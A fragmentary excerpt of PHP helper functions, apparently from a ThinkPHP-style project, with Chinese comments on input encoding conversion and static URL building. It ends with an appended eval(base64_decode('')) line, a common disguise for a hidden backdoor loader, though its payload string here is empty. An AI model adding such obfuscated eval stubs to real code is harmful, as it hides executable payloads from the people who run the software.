 ...
 * @return mixed
 */
function II($name){//II方法是将I方法返回的字符串进行编码检测,非utf-8则转换!
	$name = I($name);
	if(is_array($name)){
		foreach ($name as $a=>$k){
			$name[$a] = iconvstr($k);
 ...
 * @return string
 */
function UU($url,$arr,$static=true){
	$url = $url ? $url : ACTION_NAME;
	if($static){//静态
		$url = $arr ? '/'.$url.'/' : '/'.$url.'.html';
		$c = count($arr);
		$i=0;
		foreach ($arr as $a => $k){
			$i++;
...
eval(base64_decode('
'));
